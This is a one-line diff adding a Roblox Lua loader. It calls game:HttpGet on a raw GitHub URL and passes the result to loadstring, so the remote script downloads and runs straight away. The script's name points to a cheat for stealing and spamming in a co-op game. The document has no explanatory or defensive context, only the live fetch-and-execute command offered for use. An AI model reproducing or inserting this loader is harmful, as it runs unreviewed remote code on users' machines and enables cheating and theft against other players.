@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/plant-steal-co-op-spam5-hwb5bb6ajd2ps6.lua"))()
